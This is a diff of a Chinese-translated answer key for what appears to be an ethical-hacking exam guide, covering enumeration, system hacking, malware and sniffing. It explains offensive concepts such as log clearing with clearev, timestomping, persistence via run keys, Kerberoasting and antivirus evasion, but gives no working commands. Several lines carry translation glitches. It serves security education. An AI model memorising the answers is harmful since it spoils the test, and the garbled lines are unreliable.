 8. C. 扩展 SMTP (ESMTP) 协议有一个缩写为 `VRFY` 的命令，用于验证电子邮件地址。邮件服务器可能会暴露该命令，即使服务器软件支持 ESMTP。扩展邮件列表是 EXPN。你不会用 `VRFY` 以同样的方式处理邮件列表。另外两个命令没有在 SMTP 协议定义中指定。
 
@@ -13154,8 +14122,6 @@ Answers to Review Questions
 11. A. 如果你的 `VRFY` 命令针对 SMTP 服务器失败，会得到状态码 550。200 是 Web 服务器成功的状态码。其他代码在此上下文中无效。
 
 12. B. 程序 `smbclient` 和 `enum4linux` 可以通过 SMB 来枚举信息。`snmpwalk` 可用于通过 SNMP 来枚举信息。`nmap` 可以用于枚举网络上所有系统上运行的服务。
-
-
 
 13. D. 版本 1 的 SNMP 使用社区字符串。版本 2c 也使用社区字符串。版本 2 是对版本 1 的改进，但正是版本 3 实现了基于用户的身份验证以及加密。
 
@@ -13171,7 +14137,7 @@ Answers to Review Questions
 
 19. C. RMI 是使用 Java 实现进程间通信的方式。由于 Java 是面向对象的编程语言，它会传输对象。SMB 是服务器消息块（Server Message Block）协议。SunRPC 执行远程过程调用，但传输的数据不是面向对象的。`nmap` 是用于扫描端口的程序。
 
-20. A. 虽然 `nmap` 本身是一个出色的程序，可以用于跨多服务枚举数据，但它在没有额外帮助的情况下不会存储数据以便以后检索。Metasploit 也可以用于跨多服务枚举数据，并且在后端使用数据库来存储供以后检索的数据。RMI 是远程方法调用，用于在网络中实现进程间通信。PostgreSQL 是 Metasploit  commonly 使用的数据库服务器。Postgres 是 PostgreSQL 的更老的版本。
+20. A. 虽然 `nmap` 本身是一个出色的程序，可以用于跨多服务枚举数据，但它在没有额外帮助的情况下不会存储数据以便以后检索。Metasploit 也可以用于跨多服务枚举数据，并且在后端使用数据库来存储供以后检索的数据。RMI 是远程方法调用，用于在网络中实现进程间通信。PostgreSQL 是 Metasploit commonly 使用的数据库服务器。Postgres 是 PostgreSQL 的更老的版本。
 
 21. D. SMTP 中的 `VRFY` 命令用于验证地址。这里的其他命令是发送邮件所必需的。`VRFY` 命令并非必需，可以用于枚举用户。
 
@@ -13179,129 +14145,164 @@ Answers to Review Questions
 
 23. A. 最新的 NetBIOS 补丁无法保护 SMB 服务免受信息收集。其他所有答案都是有效的防止枚举的方法。
 
-24. D. 由终端用户配置共享的工作站系统可能权限较弱，这使得在该处查找共享成为一个好主意。因此，smb_enumshares 是一个合适的模块用于枚举。其他选项在端点枚举上都没有用处。
+24. D. 由终端用户配置共享的工作站系统可能权限较弱，这使得在该处查找共享成为一个好主意。因此，`smb_enumshares` 是一个合适的模块用于枚举。其他选项在端点枚举上都没有用处。
 
 25. B. 入侵检测系统可能识别枚举活动，但不会防止它。无论是 EDR 还是防病毒软件都不会防止服务枚举。基于主机的防火墙可以限制谁可以发送网络请求，从而降低枚举的可能性。
 
-Chapter 7: System Hacking
+# Chapter 7: System Hacking
 
-1. D. 文件元数据中常用的三个日期和时间戳分别是创建时间、访问时间和修改时间。文件创建时记录创建瞬间，访问时记录用户访问的瞬间，修改时记录文件被修改的瞬间。访问时间不等于修改时间，因为访问文件可能是只读操作，即使你打开文件期望修改，也未必会实际修改。访问时间仍会改变。虽然移动、添加和修改有时被称为 MAC（修改、访问、创建），但这些并不是与文件时间相关的任务。
+## 1. D
+文件元数据中常用的三个日期和时间戳分别是创建时间、访问时间和修改时间。文件创建时记录创建瞬间，访问时记录用户访问的瞬间，修改时记录文件被修改的瞬间。访问时间不等于修改时间，因为访问文件可能是只读操作，即使你打开文件期望修改，也未必会实际修改。访问时间仍会改变。虽然移动、添加和修改有时被称为 MAC（修改、访问、创建），但这些并不是与文件时间相关的任务。
 
-2. A. 账户迁移、特权迁移和账户提升是模糊且缺乏明确定义的概念，即便它们可能存在。而特权提升（privilege escalation）明确指在仅拥有普通用户权限时获得更高权限的过程。
+## 2. A
+账户迁移、特权迁移和账户提升是模糊且缺乏明确定义的概念，即便它们可能存在。而特权提升（privilege escalation）明确指在仅拥有普通用户权限时获得更高权限的过程。
 
-3. B. John 的增量模式会尝试所有在指定参数范围内的可能密码，即 John 会生成密码。John 的默认模式是单次尝试模式，利用用户名和主目录等信息通过掩码规则生成密码。增量模式不使用词典，但 John 支持使用词典。
+## 3. B
+John 的增量模式会尝试所有在指定参数范围内的可能密码，即 John 会生成密码。John 的默认模式是单次尝试模式，利用用户名和主目录等信息通过掩码规则生成密码。增量模式不使用词典，但 John 支持使用词典。
 
-4. D. Rainbow 表使用预先计算的哈希映射到明文密码，以加速从存储哈希中恢复密码的过程。虽然 Rainbow 表能加快破解速度，但它们在磁盘空间上非常昂贵。哈希和密码存储在 Rainbow 表中，精度既未被牺牲也未被优先级化；使用 Rainbow 表需要牺牲磁盘空间以换取更快的破解时间。
+## 4. D
+Rainbow 表使用预先计算的哈希映射到明文密码，以加速从存储哈希中恢复密码的过程。虽然 Rainbow 表能加快破解速度，但它们在磁盘空间上非常昂贵。哈希和密码存储在 Rainbow 表中，精度既未被牺牲也未被优先级化；使用 Rainbow 表需要牺牲磁盘空间以换取更快的破解时间。
 
-5. C. 本地漏洞针对的不是网络上监听的应用程序，这意味着你必须本地登录机器而非远程。本地漏洞不用于收集密码，也不需要利用漏洞来收集密码。同样，利用漏洞操作日志或横向移动也不需要漏洞，大多数情况需要提升权限。本地漏洞可以被利用以获得提升权限的优势。
+## 5. C
+本地漏洞针对的不是网络上监听的应用程序，这意味着你必须本地登录机器而非远程。本地漏洞不用于收集密码，也不需要利用漏洞来收集密码。同样，利用漏洞操作日志或横向移动也不需要漏洞，大多数情况需要提升权限。本地漏洞可以被利用以获得提升权限的优势。
 
-6. B. 修改文件时间戳的行为称为 timestomping，用于设置文件时间，以便混淆调查或掩盖入侵痕迹。其他选项都不是真实的概念。
+## 6. B
+修改文件时间戳的行为称为 timestomping，用于设置文件时间，以便混淆调查或掩盖入侵痕迹。其他选项都不是真实的概念。
 
-7. A. 交替数据流（Alternate Data Streams）是 NTFS（新技术文件系统）的功能，用于支持 Windows NT 中类似于 Apple 文件系统的资源分区。由于许多 Windows 实用程序和程序不原生支持交替数据流，它们无法使用或显示它们，但如果用户知道如何显示和操作交替数据流，文件仍可被访问。
+## 7. A
+交替数据流（Alternate Data Streams）是 NTFS（新技术文件系统）的功能，用于支持 Windows NT 中类似于 Apple 文件系统的资源分区。由于许多 Windows 实用程序和程序不原生支持交替数据流，它们无法使用或显示它们，但如果用户知道如何显示和操作交替数据流，文件仍可被访问。
 
-8. A. 你可以使用 PowerShell 脚本执行可能支持系统持久性的功能，但单凭脚本无法单独维持访问。交替数据流对维持访问没有帮助，而 `.vimrc` 文件是 Vi 编辑器的启动文件。Windows 注册表中的运行键（run key）可以用于在系统启动时自动运行程序，从而确保攻击者在重启后仍能获得访问。
+## 8. A
+你可以使用 PowerShell 脚本执行可能支持系统持久性的功能，但单凭脚本无法单独维持访问。交替数据流对维持访问没有帮助，而 `.vimrc` 文件是 Vi 编辑器的启动文件。Windows 注册表中的运行键（run key）可以用于在系统启动时自动运行程序，从而确保攻击者在重启后仍能获得访问。
 
-9. D. 虽然 Tor 网络可能用于获取针对漏洞的 exploit，但其可靠性存疑。Tor 网络可能包含恶意内容，即使是源代码也可能被篡改。Meterpreter 与 `msfvenom` 是 Metasploit 的组件，与发现漏洞无关。Exploit‑DB 是一个网站和库，收录可供搜索的针对已知漏洞的 exploit。
+## 9. D
+虽然 Tor 网络可能用于获取针对漏洞的 exploit，但其可靠性存疑。Tor 网络可能包含恶意内容，即使是源代码也可能被篡改。Meterpreter 与 `msfvenom` 是 Metasploit 的组件，与发现漏洞无关。Exploit‑DB 是一个网站和库，收录可供搜索的针对已知漏洞的 exploit。
 
-10. C. `clearev` 命令是 Meterpreter 用于清除 Windows 事件查看器日志的命令。虽然你可以在 Meterpreter 中修改时间戳和日志文件，但不会使用 `clearev` 来实现此目的。`clearev` 不允许攻击者远程登录。
+## 10. C
+`clearev` 命令是 Meterpreter 用于清除 Windows 事件查看器日志的命令。虽然你可以在 Meterpreter 中修改时间戳和日志文件，但不会使用 `clearev` 来实现此目的。`clearev` 不允许攻击者远程登录。
+
+## 11. B
+当 Apache Web 服务器在 Linux 系统上运行时，它通常以 www‑data 用户身份运行。这是一个受限权限的账户，会阻止攻击者在系统上做太多事情。要执行任何操作（如擦除日志文件或横向移动到其他网络），需要提升权限到管理员/root 级别。利用浏览器的攻击不会在这个环境下进行，而且大多数 Web 服务器甚至没有浏览器安装。
+
+## 12. C
+攻击者通常会在系统上安装额外文件并启动额外进程。这些行为很容易通过手动调查或自动化检测工具被发现。规避的方法是安装 rootkit，它可能包括内核模式驱动或替换系统实用程序，从而隐藏这些文件和进程的存在。交替数据流可以用来隐藏文件，但不能隐藏进程。注册表键也可以隐藏文件，但不能隐藏进程。
+
+## 13. B
+Pivoting 是使用已被 compromize 的系统来在目标环境内移动到其他系统和网络的过程。Pivoting 不会提升权限或提供持久访问。你可能最终到达数据库服务器，但这并不是 pivoting 的主要目的或专用功能，它只是 pivoting 的一个 pleasant side effect。
+
+## 14. B
+程序 `rtgen` 是 `rcrack` 套件的一部分。`rcrack` 用于使用彩虹表破解密码。它用于生成 `rcrack` 将用于破解密码的彩虹表。彩虹表不是字典表，而是明文密码到哈希的映射，这使得从哈希中获取密码变得更加容易。
+
+## 15. C
+malformed packets 可能导致服务器端的失败或触发漏洞。大型 ICMP 包不太可能起作用，也不会利用客户端漏洞。粗力密码攻击并不是利用漏洞的方式，即使它是一种攻击技术。发送精心构造的 URL 可能会利用浏览器的客户端漏洞。
+
+## 16. A
+Steganography 是将数据隐藏在其他数据中，例如 MP3、WAV 或视频文件等媒体文件。NT 文件系统中的交替数据流是附加在文件名上的次要数据流。rootkit 可以用来隐藏进程，它可能使用进程注入，但这并不是进程注入的结果。当你注入进程时，你把自己创建的可执行操作放入另一个可执行文件的空间中。最终结果可能是一个运行你代码的执行线程，而没有新的进程名称表明它是在运行。
+
+## 17. D
+John the Ripper 用于破解密码，而 `nmap` 用于端口扫描。它们可能是系统 compromise 整体过程的一部分，但不能单独用于 compromise 系统，尽管《The Matrix》暗示了这一点。`searchsploit` 是用于搜索本地 Exploit‑DB 仓库的程序。Metasploit 是一个 exploit 框架，可以用于 compromise 系统，并且在系统被 compromise 后可以用于后期操作，利用其自带的模块。
+
+## 18. B
+在给出的选项中，只有浏览器存在于客户端。按照定义，Web 服务器位于服务器端。Web 应用防火墙（WAF）放置在服务器端，用于防护服务器免受应用层攻击。Web 页面托管在 Web 服务器上，它们不是客户端 exploit 的目标，但可以用于发起这些攻击。
+
+## 19. C
+rootkit 是一种恶意软件，用于执行多项任务。它可以通过使用内核模式驱动或替换系统实用程序来隐藏进程和文件。rootkit 还可能为攻击者提供后门，以便在初始 compromise 后长期保持对系统的访问。其他选项中的任何一个都不是 rootkit 的功能。
+
+## 20. B
+John the Ripper 和彩虹表是用于破解密码的工具，而不是用于获取或获得密码哈希。进程 dumping 可能会导出某个进程或应用程序关联的密码，但不一定能获得密码哈希，这取决于密码在内存中如何维护。进程 dumping 是将进程的内存空间写入磁盘以便分析。Mimikatz 是一个实用程序和 Metasploit 模块，用于从受 compromise 的系统中提取密码。
+
+## 21. B
+你会对 PowerShell 脚本使用混淆技术。混淆过程可能包含一些编码，但也可能使用编码用于其他合法目的。彩虹表用于破解密码，Kerberoasting 是在 Windows 系统上通过网络收集密码信息的方法。
+
+## 22. A
+你会在 Windows 网络中使用 Kerberoasting，因为用于在用户系统和服务器之间交换认证信息的协议是 Kerberos。Fuzzing 是向应用程序发送异常数据以期使其崩溃的方法。Rootkit 用于保持攻击者的访问并隐藏其在系统中的存在。PowerShell 脚本用于很多目的，但不是最佳的远程收集密码的方式。
+
+## 23. D
+Ruby 不够常见，虽然 Python 在类 Unix 系统（如 macOS 和 Linux）上很常见，PowerShell 则因为默认安装在所有当前 Windows 系统上且 Windows 系统数量更多，所以更常见。Cmdlets 是 PowerShell 的一部分，但不是语言本身。
+
+## 24. D
+Rubeus 用于攻击 Windows 网络上的 Kerberos 协议。Ophcrack 是用于密码破解的彩虹表工具。John the Ripper 也是用于密码破解的工具。Peach 是一个用于进行 fuzzing 的工具，即向应用程序发送异常数据，希望使其崩溃，从而暗示新的漏洞。
+
+## 25. B
+Rubeus 是针对 Kerberos‑based 网络的工具。Empire 是一组用于攻击 Windows 系统的 PowerShell 脚本集合。Ophcrack 用于破解密码。Meterpreter 是 Metasploit 中的操作系统无关接口，用于在系统被 compromise 后使用。
+
+# Chapter 8: Malware
+
+## 1. A
+C2 服务器是 command and control 服务器，用于管理和控制僵尸网络（botnet）中的 bots。通信可能使用 IRC 或 HTTP，但不一定。I​SC2 服务器不存在。
+
+## 2. C
+both worms and viruses could be written to use polymorphic code, which means they could modify what they look like as they propagate. A worm, though, could self‑propagate. It's the one distinction between worms and viruses. Viruses require some user intervention to propagate and execute.
+
+## 3. C
+静态分析是对可执行文件的属性进行检查，评估其汇编代码，而不运行程序。这会限制感染风险，因为如果做得正确，你不会运行程序，从而避免感染。动态分析是可靠的，恶意软件无法在不运行的情况下部署。动态分析通常在虚拟机中进行。
+
+## 4. D
+VirusTotal 将数十个防病毒引擎的样本运行通过，以识别可能的恶意软件。VirusTotal 是一个网站，意味着它不能检查你的系统是否有病毒，也不能提供端点防护。虽然 VirusTotal 可以识别不同防病毒解决方案为该样本分配的名称，但要查找与该恶意软件相关的研究，需要查阅对应的防病毒厂商。
+
+## 5. D
+PE 文件包含多个部分（section），在可执行文件中常见的有 `.text` 与 `.data`。`.text` 部分包含所有可执行代码，`.data` 部分包含所有预定义并初始化的变量。其他答案中列出的部分不是 PE 文件的 section。
+
+## 6. B
+Metasploit 可用于从其 payload 模块生成自定义恶意软件。Empire 是基于 PowerShell 的另一个利用框架。IDA Pro 是调试器，Rcconsole 不存在。
+
+## 7. A
+所有已编译的程序都是二进制文件，即使是脚本语言在到达处理器时也已经是二进制。Packer 会让程序变小，这在带宽不普遍时很有价值，但 Packer 不执行编译，也不删除空字符。Packer 可以通过掩盖真实代码来隐藏程序，因为唯一的可执行函数是用于提取并解压真实恶意软件的函数。
+
+## 8. C
+Polymorphic（多体）意味着它有多种外观。当程序拥有多种外观时，会导致防病毒程序误判它。多体代码在复制或移动到另一系统或位置时会重写程序。它既不提高效率，也不帮助传播，虽然它可能是传播过程的一部分，也不会加速编译。
+
+## 9. B
+Python 解释器的执行速度可能比编译程序慢，但差异微乎其微，且在恶意软件方面通常不担心执行速度。Python 易学，且有大量社区库。挑战在于，除非使用 Python 编译器编译脚本，否则需要 Python 解释器。Windows 系统通常没有预装 Python 解释器。
+
+## 10. C
+Cuckoo Sandbox 是一组用于运行恶意软件并识别系统变化的程序和基础设施，用于动态分析恶意软件，而非静态分析。它是自动化的，不是手动的，也用于分析而非开发。
+
+## 11. B
+进行静态分析时需要能够进行反汇编的工具。动态分析可以使用已反汇编的可执行文件，但工具也必须能够执行代码。IDA 是唯一同时具备反汇编和执行能力的工具。Cutter 只做反汇编，PE Explorer 两者皆不具备，MalAlyzer 不存在。
+
+## 12. A
+可执行文件包含 CPU 在运行时解释的二进制值（机器码）。这些二进制值对人来说意义不大。因此使用反汇编器将机器码转换为助记符（mnemonics），即简短的词，帮助人们了解机器码的含义。
+
+## 13. C
+Dropper（下载器）会下载（drop）额外文件，这些文件可能是恶意软件。它不执行其他选项中提到的任何操作。
+
+## 14. B
+Encoder（编码器）用于改变可执行文件的外观，以防止防病毒程序识别其为恶意软件。它不编译恶意软件，也不规避用户检测；Packer 用于压缩恶意软件。
+
+## 15. B
+`msfvenom` 用于将 Metasploit 中的 payload 模块转换为可执行程序。恶意软件可能被用作“中毒药丸”（poison pill）之类的防御性战术，但仅凭命令行很难判断。此过程会对恶意软件进行编码，但它并不是已有的恶意软件，也不是启动 Metasploit 的方式，尽管它利用了 Metasploit 框架。
+
+## 16. A
+这是一道有点“陷阱”的问题。勒索软件（Ransomware）可能是一种病毒，即病毒的子集。勒索软件可能要求以比特币支付，但不包含比特币。勒索软件遍布全球，病毒在所有操作系统上运行。
 
 
 
+17. C. Trojan（特洛伊木马）看似是一件事，实际上是另一件事。它可以欺骗用户运行恶意软件，因为用户期待的不是它。如果可执行文件的签名与之匹配，`Trojan` 无法规避防病毒；它不是恶意基础设施，虽然它可能是多体的，但这并不是使用 `Trojan` 的原因。
 
-11. B. 当 Apache Web 服务器在 Linux 系统上运行时，它通常以 www‑data 用户身份运行。这是一个受限权限的账户，会阻止攻击者在系统上做太多事情。要执行任何操作（如擦除日志文件或横向移动到其他网络），需要提升权限到管理员/root 级别。利用浏览器的攻击不会在这个环境下进行，而且大多数 Web 服务器甚至没有浏览器安装。
-
-12. C. 攻击者通常会在系统上安装额外文件并启动额外进程。这些行为很容易通过手动调查或自动化检测工具被发现。规避的方法是安装 rootkit，它可能包括内核模式驱动或替换系统实用程序，从而隐藏这些文件和进程的存在。交替数据流可以用来隐藏文件，但不能隐藏进程。注册表键也可以隐藏文件，但不能隐藏进程。
-
-13. B. Pivoting 是使用已被 compromize 的系统来在目标环境内移动到其他系统和网络的过程。Pivoting 不会提升权限或提供持久访问。你可能最终到达数据库服务器，但这并不是 pivoting 的主要目的或专用功能，它只是 pivoting 的一个 pleasant side effect。
-
-14. B. 程序 `rtgen` 是 `rcrack` 套件的一部分。`rcrack` 用于使用彩虹表破解密码。它用于生成 `rcrack` 将用于破解密码的彩虹表。彩虹表不是字典表，而是明文密码到哈希的映射，这使得从哈希中获取密码变得更加容易。
-
-15. C.  malformed packets 可能导致服务器端的失败或触发漏洞。大型 ICMP 包不太可能起作用，也不会利用客户端漏洞。粗力密码攻击并不是利用漏洞的方式，即使它是一种攻击技术。发送精心构造的 URL 可能会利用浏览器的客户端漏洞。
-
-16. A. Steganography 是将数据隐藏在其他数据中，例如 MP3、WAV 或视频文件等媒体文件。NT 文件系统中的交替数据流是附加在文件名上的次要数据流。rootkit 可以用来隐藏进程，它可能使用进程注入，但这并不是进程注入的结果。当你注入进程时，你把自己创建的可执行操作放入另一个可执行文件的空间中。最终结果可能是一个运行你代码的执行线程，而没有新的进程名称表明它是在运行。
-
-17. D. John the Ripper 用于破解密码，而 `nmap` 用于端口扫描。它们可能是系统 compromise 整体过程的一部分，但不能单独用于 compromise 系统，尽管《The Matrix》暗示了这一点。`searchsploit` 是用于搜索本地 Exploit‑DB 仓库的程序。Metasploit 是一个 exploit 框架，可以用于 compromise 系统，并且在系统被 compromise 后可以用于后期操作，利用其自带的模块。
-
-18. B. 在给出的选项中，只有浏览器存在于客户端。按照定义，Web 服务器位于服务器端。Web 应用防火墙（WAF）放置在服务器端，用于防护服务器免受应用层攻击。Web 页面托管在 Web 服务器上，它们不是客户端 exploit 的目标，但可以用于发起这些攻击。
-
-19. C. rootkit 是一种恶意软件，用于执行多项任务。它可以通过使用内核模式驱动或替换系统实用程序来隐藏进程和文件。rootkit 还可能为攻击者提供后门，以便在初始 compromise 后长期保持对系统的访问。其他选项中的任何一个都不是 rootkit 的功能。
-
-20. B. John the Ripper 和彩虹表是用于破解密码的工具，而不是用于获取或获得密码哈希。进程 dumping 可能会导出某个进程或应用程序关联的密码，但不一定能获得密码哈希，这取决于密码在内存中如何维护。进程 dumping 是将进程的内存空间写入磁盘以便分析。Mimikatz 是一个实用程序和 Metasploit 模块，用于从受 compromise 的系统中提取密码。
-
-21. B. 你会对 PowerShell 脚本使用混淆技术。混淆过程可能包含一些编码，但也可能使用编码用于其他合法目的。彩虹表用于破解密码，Kerberoasting 是在 Windows 系统上通过网络收集密码信息的方法。
-
-22. A. 你会在 Windows 网络中使用 Kerberoasting，因为用于在用户系统和服务器之间交换认证信息的协议是 Kerberos。Fuzzing 是向应用程序发送异常数据以期使其崩溃的方法。Rootkit 用于保持攻击者的访问并隐藏其在系统中的存在。PowerShell 脚本用于很多目的，但不是最佳的远程收集密码的方式。
-
-23. D. Ruby 不够常见，虽然 Python 在类 Unix 系统（如 macOS 和 Linux）上很常见，PowerShell 则因为默认安装在所有当前 Windows 系统上且 Windows 系统数量更多，所以更常见。Cmdlets 是 PowerShell 的一部分，但不是语言本身。
-
-24. D. Rubeus 用于攻击 Windows 网络上的 Kerberos 协议。Ophcrack 是用于密码破解的彩虹表工具。John the Ripper 也是用于密码破解的工具。Peach 是一个用于进行 fuzzing 的工具，即向应用程序发送异常数据，希望使其崩溃，从而暗示新的漏洞。
-
-25. B. Rubeus 是针对 Kerberos‑based 网络的工具。Empire 是一组用于攻击 Windows 系统的 PowerShell 脚本集合。Ophcrack 用于破解密码。Meterpreter 是 Metasploit 中的操作系统无关接口，用于在系统被 compromise 后使用。
-
-Chapter 8: Malware
-
-1. A. C2 服务器是 command and control 服务器，用于管理和控制僵尸网络（botnet）中的 bots。通信可能使用 IRC 或 HTTP，但不一定。I​SC2 服务器不存在。
-
-2. C.  both worms and viruses could be written to use polymorphic code, which means they could modify what they look like as they propagate. A worm, though, could self‑propagate. It's the one distinction between worms and viruses. Viruses require some user intervention to propagate and execute.
-
-3. C. 静态分析是对可执行文件的属性进行检查，评估其汇编代码，而不运行程序。这会限制感染风险，因为如果做得正确，你不会运行程序，从而避免感染。动态分析是可靠的，恶意软件无法在不运行的情况下部署。动态分析通常在虚拟机中进行。
-
-4. D. VirusTotal 将数十个防病毒引擎的样本运行通过，以识别可能的恶意软件。VirusTotal 是一个网站，意味着它不能检查你的系统是否有病毒，也不能提供端点防护。虽然 VirusTotal 可以识别不同防病毒解决方案为该样本分配的名称，但要查找与该恶意软件相关的研究，需要查阅对应的防病毒厂商。
-
-
-
-
-5. D. PE 文件包含多个部分（section），在可执行文件中常见的有 `.text` 与 `.data`。`.text` 部分包含所有可执行代码，`.data` 部分包含所有预定义并初始化的变量。其他答案中列出的部分不是 PE 文件的 section。
-
-6. B. Metasploit 可用于从其 payload 模块生成自定义恶意软件。Empire 是基于 PowerShell 的另一个利用框架。IDA Pro 是调试器，Rcconsole 不存在。
-
-7. A. 所有已编译的程序都是二进制文件，即使是脚本语言在到达处理器时也已经是二进制。Packer 会让程序变小，这在带宽不普遍时很有价值，但 Packer 不执行编译，也不删除空字符。Packer 可以通过掩盖真实代码来隐藏程序，因为唯一的可执行函数是用于提取并解压真实恶意软件的函数。
-
-8. C. Polymorphic（多体）意味着它有多种外观。当程序拥有多种外观时，会导致防病毒程序误判它。多体代码在复制或移动到另一系统或位置时会重写程序。它既不提高效率，也不帮助传播，虽然它可能是传播过程的一部分，也不会加速编译。
-
-9. B. Python 解释器的执行速度可能比编译程序慢，但差异微乎其微，且在恶意软件方面通常不担心执行速度。Python 易学，且有大量社区库。挑战在于，除非使用 Python 编译器编译脚本，否则需要 Python 解释器。Windows 系统通常没有预装 Python 解释器。
-
-10. C. Cuckoo Sandbox 是一组用于运行恶意软件并识别系统变化的程序和基础设施，用于动态分析恶意软件，而非静态分析。它是自动化的，不是手动的，也用于分析而非开发。
-
-11. B. 进行静态分析时需要能够进行反汇编的工具。动态分析可以使用已反汇编的可执行文件，但工具也必须能够执行代码。IDA 是唯一同时具备反汇编和执行能力的工具。Cutter 只做反汇编，PE Explorer 两者皆不具备，MalAlyzer 不存在。
-
-12. A. 可执行文件包含 CPU 在运行时解释的二进制值（机器码）。这些二进制值对人来说意义不大。因此使用反汇编器将机器码转换为助记符（mnemonics），即简短的词，帮助人们了解机器码的含义。
-
-13. C. Dropper（下载器）会下载（drop）额外文件，这些文件可能是恶意软件。它不执行其他选项中提到的任何操作。
-
-14. B. Encoder（编码器）用于改变可执行文件的外观，以防止防病毒程序识别其为恶意软件。它不编译恶意软件，也不规避用户检测；Packer 用于压缩恶意软件。
-
-15. B. `msfvenom` 用于将 Metasploit 中的 payload 模块转换为可执行程序。恶意软件可能被用作“中毒药丸”（poison pill）之类的防御性战术，但仅凭命令行很难判断。此过程会对恶意软件进行编码，但它并不是已有的恶意软件，也不是启动 Metasploit 的方式，尽管它利用了 Metasploit 框架。
-
-16. A. 这是一道有点“陷阱”的问题。勒索软件（Ransomware）可能是一种病毒，即病毒的子集。勒索软件可能要求以比特币支付，但不包含比特币。勒索软件遍布全球，病毒在所有操作系统上运行。
-
-17. C. Trojan（特洛伊木马）看似是一件事，实际上是另一件事。它可以欺骗用户运行恶意软件，因为用户期待的不是它。如果可执行文件的签名与之匹配，Trojan 无法规避防病毒；它不是恶意基础设施，虽然它可能是多体的，但这并不是使用 Trojan 的原因。
-
-18. B. 动态分析恶意软件时，调试器很有用，因为它可以运行并控制恶意软件的执行。OllyDbg 是列表中唯一的调试器。Cutter 只做反汇编，不支持运行并控制恶意软件。
+18. B. 动态分析恶意软件时，调试器很有用，因为它可以运行并控制恶意软件的执行。`OllyDbg` 是列表中唯一的调试器。`Cutter` 只做反汇编，不支持运行并控制恶意软件。
 
 19. C. 传统的 C2（命令与控制）基础设施由客户端和服务器组成。客户端是感染系统上的软件，服务器发送 C2 消息给客户端。卫星或主站都不是 C2 基础设施的组成部分。
 
 20. D. 防火墙可能阻止入站通信，因此最好让通信发起方位于内部。双向流量都可能被入侵检测捕获。虚拟机在此情形下不产生影响，防病毒也可能通过可执行文件而非通信流来检测恶意软件。
 
-21. B. 混淆（Obfuscation）是让程序难以阅读或分析的过程。反汇编将机器码转换为汇编语言。Packing 是对可执行文件进行压缩，这会使其难以理解。
+21. B. 混淆（Obfuscation）是让程序难以阅读或分析的过程。反汇编将机器码转换为汇编语言。`Packing` 是对可执行文件进行压缩，这会使其难以理解。
 
-22. C. `strings` 实用程序可用于对可执行文件进行表面分析，获取如库名称等信息。哈希可用于在数据库中识别已知恶意文件。Metasploit 用于攻击系统。Ghidra 是由 NSA 开发的工具，部分相当于反汇编器，并提供额外的恶意软件分析功能。
+22. C. `strings` 实用程序可用于对可执行文件进行表面分析，获取如库名称等信息。哈希可用于在数据库中识别已知恶意文件。`Metasploit` 用于攻击系统。`Ghidra` 是由 NSA 开发的工具，部分相当于反汇编器，并提供额外的恶意软件分析功能。
 
-23. D. 数据丢失是勒索软件可能带来的多种影响之一；如果担心数据丢失，保持良好的备份实践会帮助防止此类损失。反恶意软件、Endpoint Detection and Response（EDR）以及指标（indicators of compromise）不能防止数据丢失。
+23. D. 数据丢失是勒索软件可能带来的多种影响之一；如果担心数据丢失，保持良好的备份实践会帮助防止此类损失。反恶意软件、`Endpoint Detection and Response（EDR）`以及指标（indicators of compromise）不能防止数据丢失。
 
-24. A. 由于某些勒索软件使用文件加密来阻止对数据的正常访问，解密工具可以用于恢复此类勒索软件攻击。加密工具已经被使用过，这里没有帮助。Endpoint Detection and Response（EDR）或反恶意软件在文件已被加密后也无用。
+24. A. 由于某些勒索软件使用文件加密来阻止对数据的正常访问，解密工具可以用于恢复此类勒索软件攻击。加密工具已经被使用过，这里没有帮助。`Endpoint Detection and Response（EDR）`或反恶意软件在文件已被加密后也无用。
 
 25. C. 防恶意软件软件可以识别运行系统中的任何内容。但引导区（pre‑boot）恶意软件可以通过拦截系统调用来隐藏并保护自己，从而使防病毒无法正常工作。只有在加载到操作系统之前，恶意软件才能规避检测。其他选项均能够通过更新签名和行为分析技术被防病毒捕获。
 
-Chapter 9: Sniffing
+## Chapter 9: Sniffing
 
-1. C.  different vendors use different terms for port mirroring. Cisco uses the term Switch Port Analyzer (SPAN), which leads to the process sometimes being called port spanning.
+1. C. different vendors use different terms for port mirroring. Cisco uses the term Switch Port Analyzer (SPAN), which leads to the process sometimes being called port spanning.
 
-2. B. The expression host 192.168.10.5 is BPF, indicating that `tcpdump` should only capture packets to and from 192.168.10.5. If you wanted to only get it to or from, you would need to modify `host` with `src` or `dest`.
+2. B. The expression `host 192.168.10.5` is BPF, indicating that `tcpdump` should only capture packets to and from 192.168.10.5. If you wanted to only get it to or from, you would need to modify `host` with `src` or `dest`.
 
-3. D. `tcpdump` uses the format *hostname/IP.port* when it prints an address. The addresses go source > destination, so yazpistachio.lan is the hostname, and 62882 is the port on the source address.
-
-
+3. D. `tcpdump` uses the format `hostname/IP.port` when it prints an address. The addresses go source > destination, so `yazpistachio.lan` is the hostname, and `62882` is the port on the source address.
 
 4. A. 默认情况下，`tcpdump` 会进行名称解析。除了查找端口号并打印其服务名称外，`tcpdump` 还会触发 DNS 查找。此 DNS 查找是网络流量，这意味着在大多数数据包中，捕获的数据包中很可能出现 DNS 查找请求。
 
@@ -13335,7 +14336,7 @@ Chapter 9: Sniffing
 
 19. C. 交换机仅通过将流量发送至与 MAC 地址关联的端口来过滤流量。交换机可靠，不支持层 3（虽然存在多层交换机具备路由功能），而端口镜像与此无关。交换机可以聚合端口，但端口镜像与此无关。
 
-20. B. 将红 irection 用于 Ettercap 的 `ipchains/iptables` 命令在不同文件中完成。`etter.dns` 文件中包含主机名到 IP 地址的映射以及其他 DNS 资源记录。
+20. B. 将红irection 用于 Ettercap 的 `ipchains/iptables` 命令在不同文件中完成。`etter.dns` 文件中包含主机名到 IP 地址的映射以及其他 DNS 资源记录。
 
 21. C. 在标志位中可以看到 PROMISC，这表明接口处于混 promiscuous 模式，这对于系统能够监听网络流量是必要的。没有混 promiscuous 模式，系统只能接收特定目标的数据包。虽然其他攻击也可能在进行，但仅凭此输出可以确定接口处于混 promiscuous 模式，暗示正在进行网络嗅探。
 
@@ -13347,7 +14348,7 @@ Chapter 9: Sniffing
 
 25. D. `sslstrip` 利用 SSL/TLS 加密的漏洞。该漏洞在后续 TLS 版本中已修复。SSL 版本和早期 TLS 版本都易受影响，TLS v1.3 不受 `sslstrip` 攻击影响。
 
-Chapter 10: Social Engineering
+## Chapter 10: Social Engineering
 
 1. A. 生物特征是使用物理特征进行身份验证。Smishing 是利用短信（SMS/文本）收集信息。Rogue access 并不存在。Pretexting 是编造可信故事，用于社交工程攻击。
 
